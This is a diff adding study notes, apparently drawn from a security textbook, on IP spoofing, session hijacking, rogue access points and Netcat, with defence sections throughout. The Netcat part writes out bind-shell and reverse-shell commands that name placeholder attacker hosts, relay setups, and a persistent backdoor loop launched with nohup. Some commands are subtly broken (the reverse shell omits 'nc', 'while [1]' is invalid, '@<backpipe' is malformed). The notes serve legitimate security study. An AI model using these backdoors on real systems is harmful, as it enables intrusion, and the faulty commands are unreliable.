@@ -256,6 +256,393 @@ We've already encountered a couple of examples of IP address spoofing in earlier
 
 
 ## IP Address Spoofing Flavor 1: Simple Spoofing--Simply Changing the IP Address
+This technique is by far the simplest way of spoofing another system's IP address: Just change your IP address to the other system's address.
+- Attackers can reconfigure their systems to have a different IP address quite trivially.
+- Using Linux ```ifconfig``` command, or the Windows network control panel, attackers can pick any other IP address they want. 
+
+Alternatively, rather than resetting the IP address for the whole system, the attacker could even use a single tool that generates packets with the desired IP address. 
+- Nmap and Dsniff do this by creating specific packets appearing to come from another system without altering the network configuration of the source machine. 
+
+Finally, the attacker could employ any one of a number of custom packet crafting tools to create packets with arbitrary header fields of the attacker's choosing, including source IP addresses. Some of the best packet crafting tools available today include:
+- Hping2, for Linux
+- Nemesis, for Linux and Windows
+- NetDude, for Linux
+
+The examples in which simple spoofing works inovle sending traffic to the target, but not receiving any responses. Because of the way routing works, all responses to spoofed packets will be sent to the real system that the attacker is pretending to be. 
+- Therefore, generating packets with a spoofed IP address will not let an attacker have interactive sessions with the target, because all of the response packets will be sent to another system. 
+
+Keep in mind that TCP uses a 3-way handshake and this instinctively prevents spoofing because the lack of a response. What will happen is that the spoofed address will send a RESET since it never received the inital SYN packet. See the figure below
+![2291a92b6d8445b8040b48333443861b.png](../_resources/2291a92b6d8445b8040b48333443861b.png)
+
+Although simple spoofing is quite limited for interactive connections, it should be noted that if both Eve and Bob are on the same LAN, simple spoofing can work in interactive mode. 
+
+## IP Address Spoofing Flavor 2: Predicting TCP Sequence Numbers to Attack UNIX r-Commands
+If Eve and Bob are not on the same LAN, simple address spoofing is useless in establishing a TCP connection and interacting with the target. Our next spoofing technique gets around these difficulties by targeting weaknesses in predictable TCP sequence numbers, and using them to attack UNIX trust relationships, especially the UNIX r-commands. 
+
+r-commands are considered outdated and insecure so I am skipping this section. 
 
 
+## IP Address Spoofing Flavor 3: Spoofing With Source Routing
+A far easier method for IP address spoofing is based on source routing. This technique lets the attacker get responses in interactive sessions, and even avoid predicting TCP sequence numbers or launching a DoS attack. 
+
+As discussed in Chapter 2, source routing allows the source machine sending a packet to specify the path it will take on the network. An potion called loose source routing allows the attacker to specify just some of the hops that must be taken as the packet traverses the network. 
+- These hops are included in the packet's IP header, with the source route consisting of mileposts of routers the attacker wants to make sure the packet traverses. 
+
+If the network elements between the attacker and the victim system support source routing, spoofing can be quite trivial, as shown in the figure below. Eve generates packets with a fake source route. The packets claim to come from Alice, their apparent source IP address. The source route also includes Eve's address, making Eve look like a router between Alice and Bob that handled the packets. Finally, the route includes the destination, Bob. Eve generates spoofed packets that include this source route and injects them onto the network. 
+![63c658ce0bdbc195e54a7a1706e12fa2.png](../_resources/63c658ce0bdbc195e54a7a1706e12fa2.png)
+
+Any routers between Eve and Bob will read the source route and deliver the packets to Bob. Bob will take action on the packets (establishing a TCP connection, or any other interaction) and send the response. 
+- All responses to source-routed packets inverse the route of the originating packet. Therefore, Bob will generate packets with a source route starting at Bob, going through Eve, and ending at Alice. 
+- When the packets are sent back, Eve will intercept and not forward them to any other systems. 
+
+This source routing attack seldom works across the internet, as most organizations block source-routed packets at their Internet gateway. 
+- However, a large number of organizations still allow source-routed packets to roam free on their internal networks. 
+- Therefore, an insider can launch some very interesting spoofing attacks using this technique. 
+
+## IP Spoofing Defenses
+There are several good practices to follow in avoiding the IP address spoofing attacks previously discussed. 
+
+First, you should make sure that the initial sequence numbers generated by your TCP stacks are difficult to predict. To do this, apply the latest set of security patches from your operating system vendor. 
+
+Furthermore, for Linux and Unix systems in particular, avoid using the very weak r-commands altogether. Instead, use secure replacements for r-commands like SSH or even an encrypting VPN for secure acess. 
+
+Don't use IP addresses for authentication methods since they can be easily spoofed. 
+
+Also, you should imploy so-called antispoof packet filters at your border routers and firewalls connecting your organization to the Internet and business partners. An antispoof filter is an extremely simple idea, as pictured below. 
+![3b3357ce7f0c33605400e7af7c0c7f59.png](../_resources/3b3357ce7f0c33605400e7af7c0c7f59.png)
+
+Additionally, do not allow source-routed packets through network gateways. 
+
+Finally, be careful with trust relationships throughout your environment. 
+- Avoid extending Unix and Windows trust relationships to systems across an unprotected network. 
+
+# Session Hijacking 
+Now we'll explore attacks based on a marriage of sniffing and spoofing, known as session hijacking attacks. 
+- Session hijacking tools can be particularly nasty. 
+
+Consider the hijacking example highlighted in the figure below. Alice has an established telnet session across the network to Bob. Eve sits on a segment in the network where traffic is passing from Alice to Bob.
+- With this strategic location, Eve can see the session traffic using sniffing techniques. Eve not only sees all packets going from Alice to Bob, but also can carefully monitor the TCP sequence numbers of these packets while observing the session. 
+
+At some point in the communication between Alice and Bob, Eve will decide to hijack the connection. Eve starts injecting spoofed traffic with a source IP address of Alice into the network, using the proper TCP sequence numbers on all packets. 
+- If the hijack is successful, Bob will obey the commands sent by Eve, thinking they came from Alice.
+- Eve has effectively stolen the session from Alice. Because the session is stolen as it is transmitted across the network, this technique is called network-based hijacking. 
+
+![9a09c244d47a960227ad18e1bd3ea917.png](../_resources/9a09c244d47a960227ad18e1bd3ea917.png)
+
+## Another Way: Host-Based Session Hijacking 
+Although we have focused on hijacking a session across the network, another simpler technique can be used to steal a session. 
+- If the attacker has super-user-level access on the source destination machine, the attacker can employ a host-based session hijacking tool to grab the session on the local machine itself, without intercepting any data from the network. 
+
+On a UNIX system, for an attacker with root on Alice or Bob, these tools let an attacker interact with the local terminal devices (the ```ttys``` of the UNIX machine) that are used in telent and rlogin sessions. 
+- A tty is just software tool used by various command-line programs to get information from a user through the keyboard and display information from a user through the keyboard and display information right from the victim's ```tty``` and even inject keystrokes into the ```tty```, thereby gaining complete control over the session.
+
+Network based session hijacking tools are useful if the attacker doesn't have an account on the Alice or Bob machines. However, if the attacker has already compromised the Alice or Bob machines to gain root access, the easiest way to grab a session is to use a host-based session hijacker. 
+
+There are a large number of network-based and host-based session-hijacking tools available on the internet today, including the following:
+
+- Hunt, written by Kra
+- Dsniff's sshmitm tool, allows an attacker who has setup a monkey in the middle attack against an SSH session to sniff the SSH traffic. When sniffing the session, the tool also lets the attacker type keystrokes into the SSH connection, by using the -I (for interactive) flag. 
+- Ettercap, also described earlier in this chapter, has the ability to inject characters into an active connection. 
+- Juggernaut, a network-based hijacking tool 
+- IP Watcher, a commerical network-based session hijacking tool 
+- TTYWatcher, a freeware host-based session hijacking tool
+- TTYSnoop, a freeware host-based session hijacking tool
+
+One limitation of many network-based session hijacking tools deals with how TCP sequence numbers are handled. Normally, when a system receives a packet with a TCP sequence number that is out of order, it resends its last ACK packet, making the assumption that the ACK was lost in transmission last time. This retransmission of the last ACK packet is supposed to help the systems resynchronize their sequence numbers. But what happens if when an attacker injects traffic into a TCP connection?
+- In our example, as Eve injects packets into the network, the sequence numbers of packets going back and forth from Eve to Bob will increase. As traffic gets routed back to Alice, she will see these seuqnece numbers increasing even though she hasn't sent any packets. 
+- In an effort to try and resynchronize the connection, Alice will continue to resend ACK messages to Bob again and again for a second or two. Bob responds to each of these ACKs with his own ACK, trying to convince Alice that he received the later packets she sent. These back-and-forth ACK arguments soon consume a good deal of bandwidth in what is known as an ACK storm, shown below
+![076ef9edf2b7addc82e76700a8e86e0c.png](../_resources/076ef9edf2b7addc82e76700a8e86e0c.png)
+
+During an ACK storm, performance starts to suffer as Alice and Bob thrash over the sequence number issue. Typically, Eve will be able to get one or two commands executed on Bob before the ACK storm causes the connection to be dropeed as Alice and Bob give up on the hopelessly out-of-synch connection.
+- Still, getting one or two commands executed on a target machine might be all that Eve needs. 
+- ACK storms only occur on network-based session hijacking tools
+
+How can Eve prevent an ACK storm? We've already seen one technique for getting rid of pesky packets from Alice--DoS. Eve could flood Alice or otherwise take Alice offline to prevent the ACK storm. Although this technique is effective, there are better ways to prevent an ACK storm, as implemented in Ettercap one of the best tools in the realm of network-based session hijacking. 
+
+## Session Hijacking with Ettercap
+Like most network-based session hijacking tools, Ettercap, which runs on Linux, Mac OS X, and Windows, allows an attacker to view a bunch of sessions going across the network, and select a particular one to hijack. 
+- After selecting a connection, Ettercap allows the attacker to inject characters and commands into the session stream, but Ettercap can pull off a special trick: It avoids ACK storms. 
+
+Ettercap prevents Alice from seeing packets with incorrect sequence numbers. To do this Ettercap uses the same ARP cache poisoning or port stealing setup that it uses for sniffing through a switch. Eve's machine becomes a relay for all traffic going between Alice and Bob illustrated below.
+![fc6485b3c16daf81a241a17a8ba7f36b.png](../_resources/fc6485b3c16daf81a241a17a8ba7f36b.png)
+
+This attack is conducted much like the attack used by arpspoof. Ettercap sends an unsolicited ARP reply to Alice mapping Bob's IP address to the MAC address of Eve's machine. Bob's will also receive a reply that maps Alice's IP address to Eve's MAC address. 
+- Unsoliciated ARP requests are referred to as gratuitous ARPs because an ARP response is being sent without there ever being an ARP query. 
+- This forces Alice and Bob to use Eve as a relay, they are not able to communicate between each other directly without Eve
+
+Ettercap, running on Eve's machine now selectively bridges this gap, grabbing, altering, and forwarding the packets between Alice and Bob. 
+- Whenever packets actually travel between Alice and Bob, Ettercap will "fix" the sequence number on those packets before forwarding them on. Thus preventing an ACK storm. 
+
+Hunt is another session hijacking tool that works similarly to Ettercap. It adds one other interesting feature. It attempts to resynchronize the connection so that Eve can return the session back to Alice after she uses it. 
+
+Note that the techniques used by Ettercap and Hunt work even if Alice, Bob, and Eve are on different LANs, so long as Eve is on a network connection that carries traffice between Alice and Bob. 
+- Eve simply needs to do the ARP cache poisoning against the routers on the path between Alice and Bob directly. 
+- Eve then sends gratuitous ARP messages to each router redirecting traffic for the other router to Eve, as shown in the figure below. 
+
+![b10a74a9044598a6efe722966573f634.png](../_resources/b10a74a9044598a6efe722966573f634.png)
+
+## Attacking Wireless Access Points
+All network attacks discussed thus far work on both wired and wireless networks. This next attack only works in wireless networks called access point hijacking.
+
+Wireless access points have identifiers known as SSIDs that identifies the network to potential users. 
+- Because this information is public, attackers can use this information to configure a computer to act as a duplicate of the real access point. 
+
+Once the fake access point is created, we need a way to ensure that the vicitm will connect to our fake point instead of the real one.
+
+There are several ways for the attacker to accomplish this
+1. First and easiest we can overpower the real access point using jamming equipment or having our fake signal emit a stronger signal than the real one
+2. Finally, some attackers send a stream of faked wireless "disassociate" management frames, causing the victim to disconnect from the real access point and eventually just find the fake access point.
+3. AirJack is a Linux tool that helps attackers perform this sort of action
+
+## Session Hijacking Defneses
+Utilize all of the defensive technqiues discussed for spoofing and sniffing attacks. 
+- Use encryption tools like SSH and VPNs
+- Act as if your network is already compromised
+- Encrypted sessions prevent hijacking because the attackers will not have the keys to encrypt or decrypt information
+
+Pay close attention to any warning messages in your SSH clients about changed public keys on the server. If the server's public key inexplicably changes, do not make the connection, but instead investigate why the key changed. 
+
+
+# NetCat: A General-Purpose Network Tool
+Netcat, which is often referred to as the Swiss Army knife of network tools, can be used by attackers and system administrators alike to accomplish a myriad of tasks. 
+
+The idea behind Netcat is simple. It allows a user to move data across a network, while functioning much like the Linux and UNIX cat command. However, instead of just dumping data on the local system like the cat command, Netcar moves arbitrary data over any TCP or UDP port. 
+
+As pictured in the figure below, a single Netcat executable operates in one of two modes chosen by its user: client mode and listen mode. 
+- Client Mode: Netcat initiates a connection to any TCP or UDP port on another machine, Netcat takes its data from standard input (file, keystrokes of the user, data piped into it) and sends it across the network
+- Listen Mode (evoked with the -l option): Netcat opens any TCP or UDP port on the local system and waits for data to arrive at that port
+![c9490926d8df330aabf999274c8598d3.png](../_resources/c9490926d8df330aabf999274c8598d3.png)
+
+## Netcat For File Transfer
+One of the simplest uses for Netcat is to transfer a file between two machines. Many networks block incoming or outgoing FTP, so an attacker will usually not be able to transfer files that way. 
+
+The attacker might be able to install Netcat using a buffer overflow or related attack as we discussed in chapter 7. 
+
+An attacker can transfer a file using Netcat by either pushing it from client to listener or pulling it from listener back to client. 
+- When pushing a file, an attacker sets up a Netcat listener on the destination system, listening on a specific port and dumping its output to a file. On the source system, the attacker then uses Netcat in client mode to make a connection to the destination machine on the given port, directing the file to be transferred as input. The commands to transfer a file using TCP port 1234 are as follows
+
+Destination Machine Receiving File: ```$ nc -l -p 1234 > [file]```
+Source Machine Sending File: ```$ nc [remote_machine] 1234 < [file]```
+
+![8fbf7622c6f957cde26b48e352c73702.png](../_resources/8fbf7622c6f957cde26b48e352c73702.png)
+- Alternatively, an attacker can pull a file from a machine by setting up Netcat in listener mode on the machine, redirecting the file to Netcat's input. When the Netcat client on the destination machine connects, the file will be dumped from source to destination, as shown below. Pulling a file can be implemented using the following commands in Netcat:
+
+Source machine, offering file for transfer: ```$ nc -l -p 1234 < [file]```
+Destination machine, pulling file: ```$ nc [remote_machine] 1234 > [file]```
+
+![60cdfc078544e302dd9a3b7aa6d36163.png](../_resources/60cdfc078544e302dd9a3b7aa6d36163.png)
+
+## Netcat For Port Scanning
+Netcat, supports only standard, "vanilla" port scans, which complete the TCP three-way handshake with every port checked.
+- Although not as full-featured or stealthy in doing port scans as Nmap, Netcat is still a very effective basic port-scanning tool. To conduct a TCP port scan using Netcat, an attacker would type the following:
+
+```$ echo QUIT | nc -v -w3 [target] [start port]-[end port]```
+
+![a7e23ec4e57ab199ea0f2e087f565a9f.png](../_resources/a7e23ec4e57ab199ea0f2e087f565a9f.png)
+
+This command will connect to every port in the range between startport and endport, and enter the characters QUIT at each port. 
+- We limit the wait for a response from the target to a maximum of three seconds.
+- If no traffic is received within three seconds, Netcat will give up
+- This has to happen because Netcat will get hung up on a single port that leaves its connection open
+- The verbose option (-v) causes Netcat to display a list of each successfully made connection (which indicates an open port) on the attacker's screen. 
+
+## Netcat For Making Connections To Open Ports
+When an attacker discovers ports on a system through port scanning, the next step is to connect to each open port and try to determine and possibly undermine the service listening at the port. 
+- An attacker's port scan might indicate a dozen or more open ports on the target 
+- An attacker can quickly and easily use Netcat in client mode to connect to these ports and start entering raw data to see what listening service sends back.
+- The listening service might indicate a particular application and version number, or the attacker might even be able to crash the target by entering large amount of junk on the open port.
+
+Sending data to an open port on a target system is trivial, and can be accomplished using the following command:
+```
+$ nc -u [target_machine] [portnum]
+```
+![675a5b455abcbcf9e6807349e75a5540.png](../_resources/675a5b455abcbcf9e6807349e75a5540.png)
+
+
+Reasons for using Netcat compared to other applications:
+- The output from Netcat can be more easily redirected to a file. Using the simple redirection character > in UNIX and Windows causes any output from Netcat to be dumped to a file
+- It is far easier to force Netcat to drop a connection than it is to force a telnet client to let go of a connection. 
+- Telnet inserts some control data and environment variables across the connection to the open port when it tries to do a terminal negotiation with the other side, thinking it is a telnet server. This pollutes the communication stream the attacker is using.
+- Telent puts its own error messages in the standard output stream. 
+- Telnet cannot make UDP connections
+
+## Netcat For Vulnerability Scanning 
+In addition to scanning for open ports, Netcat can be used as a limited vulnerability-scanning tool. An attacker can write various scripts that implement vulnerability checks, and interact with the target systems using Netcat to transmit the data across the network. 
+- Essentially, Netcat functions as a scanning engine. 
+
+It comes packed with these tools:
+- RPCs, with known vulnerabilities
+- Network File System exports that allow anyone on the network to look at the target's local file system
+- Weak trust relationships
+- Bad passwords (such as "root", "administrator", etc)
+- Buggy FTP servers
+
+This handful of checks is very limited compared to what a full-blown Nessus scan can accomplish. Still, Netcat is very useful for quickly writing up a new vulnerability check in shell scripts and testing for holes. 
+
+## Using Netcat To Create a Passive Backdoor Command Shell
+One of the simplest and most powerful uses of Netcat is to provide command-shell access on a specifc port. When attackers connect to this listening port, they can simply enter commands to be executed on the target machine, giving them a fully interactive remote shell. 
+- To create a backdoor shell on a machine, the attacker uses the ```-e``` option of Netcat, which tells Netcat to invoke a given program, in this case a command shell, when a connection is made. To accomplish this, the attacker first gains access to the victim machine, installs Netcat, and launches it using the following command:
+
+Victim's Machine: ```nc -l -p [port] -e /bin/sh```
+![95f93bc7e5a4646d7e6687360af70fb1.png](../_resources/95f93bc7e5a4646d7e6687360af70fb1.png)
+
+An attacker can use Netcat in client mode to connect with this backdoor listener by typing the following command on the attacking machine:
+
+Attacker's Machine: ```$ nc [victim_machine] [port]```
+![0b6515937309c2a439f1de9351c23845.png](../_resources/0b6515937309c2a439f1de9351c23845.png)
+
+In this way, Netcat can be used to create a passive, waiting listener, which will send the attacker a command shell when the attacker makes a connection using Netcat in client mode. If there is a router with packet filters or a firewall in the way, the attacker will not be able to reach the listener. 
+
+## Using Netcat to Actively Push a Backdoor Command Shell
+This technique gets attackers around the problems created when a filter blocks external access. 
+
+Instead of passively listening for an inbound connection, Netcat can actively push a command shell from machine-to-machine.
+
+The attacker begins by creating a passive listener on their machine, waiting for a command shell to be pushed to it from the victim system using the following command:
+
+Attacker's Machine: ```$ nc -l -p [port]```
+![e00dcce89daff330e19f1f781c487687.png](../_resources/e00dcce89daff330e19f1f781c487687.png)
+
+Then the attacker interacts with the victim machine, possibly using a buffer overflow, to force it to use Netcat in client mode to run a command shell and push it out to the attacker's machine. The following command executed on the victim's machine accomplishes this. 
+
+Victim's Machine: ```$ [attackers_machines] [port] -e /bin/sh```
+
+![1b1d8f2205bf5ff12aba7ebf58fdde98.png](../_resources/1b1d8f2205bf5ff12aba7ebf58fdde98.png)
+
+
+This technique, which pushes the shell access across an outbound connection, is sometimes called a **reverse shell** or shell shoveling. 
+- The major benefit is being able to avoid firewalls.
+
+It's an incoming shell implemented on an outgoing connection as illustrated below. As long as outgoing connections are allowed from the victim machine to the outside world, this technique will work
+![d40dcbfe362a4243242f3e10df33d759.png](../_resources/d40dcbfe362a4243242f3e10df33d759.png)
+
+## Relaying Traffic with Netcat
+Although a backdoor command shell (either passive or reverse) is the most common use of Netcat by the bad guys, one of its most pernicious uses invovles setting up a relay to obscure the attacker's location on the network. 
+- An attacker can configure Netcat clients and listeners to bounce an attack across a bunch of machines controlled by the attacker. The attacker's connection moves from relay to relay. 
+
+Consider the realy example shown below. The attacker controls the machines labeled Relay A and Relay B (these can be systems anywhere on the Internet conquered by the attacker exploiting security vulnerabilities). 
+- On each of these machines, the attacker sets up a Netcat listener
+- The listener then directs its input to the client on the same system
+- This client in turn forwards the traffic out across the network to the next system in the chain. 
+
+![04f4755633a1bc0a5a47aa9199014ea5.png](../_resources/04f4755633a1bc0a5a47aa9199014ea5.png)
+
+There are three popular techniques for establishing a Netcat relay: modifying ```inetd```  on UNIX/Linux, setting up a backpipe on Unix/Linux, and creating relay bat file on Windows.
+
+![62d29728d037f54651aa06c6847a83ec.png](../_resources/62d29728d037f54651aa06c6847a83ec.png)
+
+As discussed in Chapter 3, ```inetd``` is a UNIX daemon that listens for connections for services indicated in the ```/etc/inetd.conf``` file. 
+- To create a relay using ```inetd``` and Netcat, the attacker can add a line to ```/etc/inetd.conf``` that cuases ```inetd``` to listen on a specific port and launch Netcat in client mode to forward traffic. 
+- The format of the ```/etc/inetd.conf``` file is described in more detail in Chapter 3. 
+- The following line in ```/etc/inetd.conf``` will make ```inetd``` listen on TCP port 11111, spawning off a Netcat client, which will forward all traffic to TCP port 54321 on machine named ```next_hop:``` 
+
+```
+$ 11111 stream tcp nowait nobody /usr/sbin/tcpd /usr/bin/nc [next_hop] 54321
+```
+
+![5ec6ef7565afcd2fbcb6b537c8afd48c.png](../_resources/5ec6ef7565afcd2fbcb6b537c8afd48c.png)
+
+Most good system administrators will quickly notice a change in the ```/etc/inetd.conf``` file by using a file system integrity checker like Tripwire to look for changes in sensitive configuration file (like ```/etc/inetd.conf```) on at least a daily basis. Tripware can be used to implement a warning whenever sensitive files are altered. 
+
+Another method for setting up a relay that is more difficult to detect than modifiying ```/etc/inetd.conf``` uses the ```mknod``` command to create a special file that will be used to transfer data back and forth between a Netcat client and server. 
+- ```mknod``` can be used to create special files with First-In/First-Out (FIFO) properties. The first data written to the file will be the first data that will be pulled out of the file 
+
+An attacker can set up a Netcat listener on a given port, such as TCP port 11111. The output of the server is piped to a Netcat client that forwards data to the next hop on a given port, like 54321. 
+
+Additionally, any data received by the Netcat client back from the next hop is directed into the FIFO file (using the redirection tool >). This FIFO file is likewise redirected back into the Netcat listener, which will transmit the data back to the previous hop. This technique all comes together in the following commands:
+```
+$ mknod backpipe p
+$ nc -l -p 11111 @<backpipe | nc [next_hop] 54321 1>backpipe
+```
+![e1176531975803608f2ec02d7e5f3908.png](../_resources/e1176531975803608f2ec02d7e5f3908.png)
+
+This command sets up a Netcat listener on TCP port 11111, forwarding data to ```next_hop``` machine on TCP port 54321. The backpipe file is used to direct response traffic back from the destination to the source, as shown in the figure below. Trace through the connection from the attacker all the way through the relay to the victim listener and back with your finger to get a feel for how the data moves across the network through the relay. 
+![b6999af0e2d3f5501aebf21ccfff290b.png](../_resources/b6999af0e2d3f5501aebf21ccfff290b.png)
+
+A third way to create a Netcat relay involves using a batch file, a technique that is well-suited to Windows machines and can be easily adapted to Linux and UNIX systems by just substituting the proper shell (/bin/sh in place of cmd.exe). The batch file approach invovles creating a file that contains a single command to start a Netcat client. The batch file is, in effect, a really simple script that contains the following text:
+```
+C:\nc.exe [next_hop] 54321
+```
+
+The attacker must include the full path to the ```nc.exe``` we are making the assumption it is at the top of the C directory. 
+
+An attacker can choose any name for this script file, but, for clarity's sake, let's just call it ```ncrelay.bat``` Then, the attacker creates the relay by running this command:
+```
+C:\> nc -l -p 11111 -e ncrelay.bat
+```
+
+When someone connects to TCP port 11111 on the relay machine, this command will execute the ```ncrealy.bat``` file, attaching its input and output to the netcat listener. 
+- All data received by the Netcat listener on TCP 11111 is sent to the Netcat client invoked by the ```ncrelay.bat``` file, which transfers it to the destination machine on the other side. 
+
+## Persistent Netcat Listeners and Netcat HoneyPots
+It's import to note that all of the Netcat listeners we've discussed so far, including the file transfer, backdoor command shell, and relay setups are non-persistant listeners. That is once an attacker connects to the listener and drops the connection, the Netcat listener goes away, closing the port. 
+- To address this, Netcat has the ```-L``` flag that tells it to "listen harder"
+
+On Windows, an attacker can invoke a command-shell listener that will continue listening after a client drops the connection using this syntax:
+```
+C:\> nc -L -p [port] -e cmd.exe
+```
+![3a30e2b84fdb7d0d3a55327e524bd55f.png](../_resources/3a30e2b84fdb7d0d3a55327e524bd55f.png)
+
+The attacker can then connect to this shell using a Netcat client as before. However, when the attacker drops the connection from the client, typically by pressing CTRL+C, the listener starts listening again, making it a persistant listener. 
+- The attacker can reconnect at any time, therefore making a backdoor.
+
+An attacker can make a Netcat listener persistent on Unix and Linux by using a while loop, invoking the following command:
+```
+$ while [1]; do echo "Started": nc -l -p [port] -e /bin/sh; done
+```
+![fa951b22f1ccdb26f49ac0b7a1c9f032.png](../_resources/fa951b22f1ccdb26f49ac0b7a1c9f032.png)
+
+
+When executed, this command will print out "Started", listen on a given TCP port, and then invoke a command shell (/bin/sh) when someone connects
+- The only way the connection disappears is if the user who started it logs out
+
+To eliminate the problem, and to make a totally persistent listener that will let the attacker log out, the bad guy could dump the while loop syntax we just described into a file, called ```listener.sh``` for example. Then change the permissions to readable and executable, so that it can run as a script using this command:
+```
+$ chmod 555 listener.sh
+```
+
+Then, the attacker can invoke this loop in the background by using the ```nohup``` command, as follows:
+```
+$ nohup ./listener.sh &
+```
+
+On UNIX, and Linux, the ```nohup``` command makes a process keep running even if the user who invoked it logs out. 
+
+Using what we know, the good guys can use Netcat to create a little honeypot, a tool used to capture information from the bad guys. Consider this while loop, which can be dumped into a file called ```honeypot.sh```
+
+```
+$ while [1]; do echo "Started"; nc -l -p [port] >> capture.txt; done
+```
+
+This loop invokes a Netcat listener on the given port number. When someone connects and sends data, the listener will append all received data in a file called ```capture.txt```. Then, when the connection is dropped, the listener will start again. 
+- This is called a honeypot, and it is used to capture the bad guys' actions for analysis by investigators. 
+
+To kill this command the investigator would need to use the kill command to send the -9 signal (forcing it to shut down) to the process running Netcat, as in:
+```
+$ kill -9 [pid_of_nc]
+```
+
+## Netcat Defenses
+Because Netcat can be used for so many different types of attacks, there is no single way to defend against it. To adequately secure your systems against the techniques we've discussed, you need to implement a variety of defenses, including these:
+- Preventing Netcat file transfers
+- Securing Against Port Scanning: configure systems with a minimal number of listening ports
+- Blocking Arbitrary Connections to a Port: Close all unused ports on your machien
+- Protecting against Vulnerability Scanning: Have an active program to apply system patches, keeping your machine up to date.
+- Stopping Backdoors: Know the processes running on your system
+- Preventing Relay Attacks: Use layered security in your network architecture
+- Stop Perisstent listeners: In additon to knowing which processes are running on your systems, make sure you conduct periodic port scans to look for strange, unexpected listening ports.
+ 
 # Summary
+
+Sniffing is a common attack technique that gathers information from the LAN, which could include user IDs and passwords transmitted in clear text or sensitive file or e-mail sent to or from a local system. There are an enromous number of sniffing tools available today. Passive sniffers gather traffic from the LAN without trying to manipulate the flow of data on the network. Snort, Sniffit, and Ethereal are three of the best passive sniffers available.
+
+Active sniffing invovles injecting traffic into the network to redirect packets to the sniffing machine. Active sniffing techniques allow an attacker to sniff in a switched environment, by overwhelming switches with a large number of MAC addresses, through ARP spoofing, or via port stealing techniques. Additionally, by injecting spurious DNS responses into a network, an attacker can redirect the flow of traffic from its intended source to an attacker's system. Finally, using active sniffing techniques, an attacker can set up a monkey-in-the-middle attack to read traffic from SSL and SSH encrypted sessions. Dsniff and Ettercap are two of the most powerful active sniffing tools, supporting all of these capabilities. 
+
+To defend against sniffing attacks, you should use secure protocols that include strong authentication and encryption. If your browser or SSH client warns you that the certificate or key is not valid or has changed, you should investigate. Also, get rid of hubs or sensitive network switches, which support stronger security. Finally, for networks handling highly sensitive information, activate port-level security on your switches to lock down MAC addresses to particular physical ports on the switch. 
+
+IP address spoofing allows attackers to send traffic that appears to come from a machine with another IP address. This type of attack is useful in creating decoys, bypassing filtering, and gaining acess to systems that use IP addresses for authentication.
+
+Session hijacking techniques allow an attacker to grab an active session such as tleent or FTP, from a legitimate user. The attacker steals the sesssion, and can enter commands and view the results. Session hijacking techniques can be employed across the network or at an individual host. Network-based session hijacking techniques can result in an ACK storm as systems try to resynchronize their connection. Ettercap and Hunt use ARP cache poisoning to avoid ACK storms. To defend against session hijacking techniques, you should utilize encryption tools, such as SSH with protocol version 2 or VPNs.
+
+Netcat is a general-purpose tool that moves data across a netwokr. It can be used in a variety of attack scenarios, limited only by the attacker's creativity and knowledge of Netcat. Netcat can be used to transfer files or scan for open ports. It makes connections to open ports and conducts rudimentary vulnerability scans. Two of Netcat's most powerful abilities are to create backdoors and establish relays. 
